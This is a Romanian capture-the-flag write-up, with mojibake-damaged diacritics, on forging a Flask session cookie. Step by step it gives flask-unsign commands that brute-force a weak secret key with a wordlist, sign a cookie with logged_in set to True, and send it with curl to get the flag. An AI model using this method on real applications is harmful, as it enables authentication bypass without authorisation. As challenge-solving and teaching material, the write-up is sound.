### ğŸš© Write-up: Challenge Access Denied (Flask Session Manipulation)

* **1. Analiza iniÈ›ialÄƒ a Serverului**
    * **ComandÄƒ:** `curl -i http://34.40.105.109:31566`
    * **ExplicaÈ›ie:** Am verificat header-ele de rÄƒspuns. Am identificat serverul ca fiind `Werkzeug/Python` È™i prezenÈ›a unui cookie de sesiune numit `session`.
    * **Indiciu:** Valoarea cookie-ului Ã®ncepea cu `eyJ...`, ceea ce indicÄƒ un format Base64 specific sesiunilor Flask.

* **2. Decodarea Cookie-ului (Reconnaissance)**
    * **ComandÄƒ:** `flask-unsign --decode --cookie "[COOKIE_INITIAL]"`
    * **ExplicaÈ›ie:** Am verificat ce date sunt stocate Ã®n interiorul sesiunii fÄƒrÄƒ a Ã®ncerca sÄƒ le modificÄƒm.
    * **Rezultat:** Am aflat cÄƒ structura este `{'logged_in': False}`.

* **3. Brute-force pentru Secret Key**
    * **ComandÄƒ:** `flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "[COOKIE_INITIAL]" --no-literal-eval`
    * **ExplicaÈ›ie:** Deoarece sesiunile Flask sunt semnate criptografic, am avut nevoie de cheia secretÄƒ a serverului pentru a genera un cookie nou valid.
    * **Rezultat:** Am gÄƒsit cheia secretÄƒ: `password`. Argumentul `--no-literal-eval` a fost necesar pentru a procesa corect intrÄƒrile din wordlist.

* **4. Sincronizarea Timpului (Critical Step)**
    * **Comenzi:** * `sudo timedatectl set-timezone Europe/Bucharest`
        * `sudo timedatectl set-ntp true`
    * **ExplicaÈ›ie:** Sesiunile Flask conÈ›in un timestamp. DacÄƒ ora sistemului local (Kali) nu coincide cu cea a serverului, cookie-ul este respins ca fiind expirat. Sincronizarea a asigurat validitatea timestamp-ului.

* **5. Generarea Cookie-ului Falsificat (Exploit)**
    * **ComandÄƒ:** `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password' --no-literal-eval`
    * **ExplicaÈ›ie:** Folosind cheia gÄƒsitÄƒ (`password`), am creat o sesiune nouÄƒ unde am schimbat starea utilizatorului Ã®n `True`.
    * **Rezultat:** Am obÈ›inut un token semnat care va fi acceptat de server ca fiind legitim.

* **6. ObÈ›inerea Flag-ului**
    * **ComandÄƒ:** `curl -i http://34.40.105.109:31566 -b "session=[NOUL_COOKIE]"`
    * **ExplicaÈ›ie:** Am trimis cererea HTTP finalÄƒ injectÃ¢nd cookie-ul falsificat prin flag-ul `-b`.
    * **Rezultat:** Serverul a validat sesiunea È™i a returnat codul `200 OK` Ã®mpreunÄƒ cu flag-ul.
